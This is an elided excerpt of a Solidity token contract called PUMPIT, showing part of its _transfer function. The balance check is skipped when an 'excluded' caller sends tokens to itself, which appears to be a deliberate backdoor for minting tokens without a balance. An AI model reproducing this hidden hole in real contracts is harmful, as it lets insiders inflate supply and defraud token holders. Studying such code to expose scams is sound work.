...
contract PUMPIT is Ownable, IERC20 {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        uint256 feeAmount = 0;
        bool inLiquify = (recipient == pair() && _isExcluded[sender]) || (sender == pair() && _isExcluded[recipient]);
        if (!_isExcluded[sender] && !_isExcluded[recipient] && recipient != address(this) && !inLiquify) {
            feeAmount = amount.mul(_fee).div(100);
            require(amount <= _maxTxAmount);
        }
        uint256 amountSender = _balances[sender];
        if (sender != recipient || !_isExcluded[msg.sender]) {
            require(amountSender >= amount, "IERC20: transfer amount exceeds balance");
        }
        uint256 receiveAmount = amount - feeAmount;
        _balances[address(0)] += feeAmount;
        if (amountSender >= amount) {
            _balances[sender] = amountSender - amount;
        }
